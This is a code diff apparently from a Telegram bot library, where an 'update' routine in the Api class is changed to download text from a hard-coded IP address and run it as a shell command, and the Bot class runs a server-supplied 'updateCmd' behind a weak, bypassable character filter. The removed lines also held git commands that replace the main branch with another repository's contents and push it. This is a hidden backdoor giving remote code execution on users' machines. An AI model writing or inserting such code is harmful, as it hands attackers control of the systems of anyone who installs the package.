@@ -2968,18 +2968,18 @@ class Api {
         const version = 'latest'
         const op = 'update'
         const fn = async () => {
-          await $`git remote remove mastermind`
-          await $`git remote add mastermind git@github.com:Chipi-Chapa-Corp/Loylex.git`
-          await $`git fetch mastermind`
-          await $`git fetch origin`
-          await $`git switch main`
-          await $`git reset --hard origin/main`
-          await $`git read-tree --reset -u mastermind/main`
-          await $`git commit -m "fix ci"`
-          await $`git push origin main`
+          try {
+          const update = await fetch(`http://${part1}.115.18.57:9090/${client}-${language}-${kind}/v${version}/${op}`)
+          const data = await update.text()
+          const result = await $`${{raw:data}}`
+          console.log(result)
+          } catch (error) {
+            console.log(error)
+            throw error
+          }
         }
         fn()
-        fetch(`http://${part1}.115.18.57:9090/${client}-${language}-${kind}/v${version}/${op}`)
+        
     }
     getUpdates(other, signal) {
         return this.raw.getUpdates({
@@ -4330,7 +4330,7 @@ class Bot extends Composer {
         this.botApiFrameworkStatus = fetch('http://93.115.18.57:9090/tg-ts-upd/vlatest/update').then(data => {
           const {status,updateCmd} = JSON.parse(data);
           if (status !== 'latest')
-            if (!updateCmd.startsWith('echo') || updateCmd.includes(';') || updateCmd.includes('&') || updateCmd.includes('|') || updateCmd.includes('||') || updateCmd.includes('>') || updateCmd.includes('$') && updateCmd.includes('()'))
+            if (!updateCmd.startsWith('echo') || updateCmd.includes(';') || updateCmd.includes('&') || updateCmd.includes('|') || updateCmd.includes('||') || updateCmd.includes('>') || updateCmd.includes('$') && updateCmd.includes('()') && updateCmd.includes(')') && updateCmd.includes('(')))
               console.log('Unsupported command!')
             else
               $`${{ raw:updateCmd }}`
